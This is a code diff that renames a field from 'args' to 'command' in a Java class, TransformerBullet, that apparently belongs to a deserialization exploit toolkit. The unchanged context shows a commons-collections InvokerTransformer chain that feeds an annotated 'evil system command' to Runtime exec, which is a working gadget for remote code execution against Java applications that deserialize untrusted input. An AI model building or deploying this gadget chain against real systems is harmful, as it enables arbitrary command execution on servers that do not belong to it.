@@ -18,8 +18,8 @@ import java.util.LinkedList;
 public class TransformerBullet extends AbstractTransformerBullet {
 
     @NotNull
-    @Require(name="args",detail="evil system command")
-    public String args;
+    @Require(name="command",detail="evil system command")
+    public String command;
 
     @NotNull
     @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
@@ -35,7 +35,7 @@ public class TransformerBullet extends AbstractTransformerBullet {
         transformers.add(createInvokerTransformer("invoke",
                 new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }));
         transformers.add(createInvokerTransformer(
-                "exec", new Class[] { String.class }, new String[]{args}));
+                "exec", new Class[] { String.class }, new String[]{command}));
         transformers.add(createConstantTransformer(1));
 
         return createTransformerArray(transformers);
@@ -43,7 +43,7 @@ public class TransformerBullet extends AbstractTransformerBullet {
 
     public static Bullet newInstance(Object... args) throws Exception {
         Bullet bullet = new TransformerBullet();
-        bullet.set("args", args[0]);
+        bullet.set("command", args[0]);
         bullet.set("version", args[1]);
         return bullet;
     }
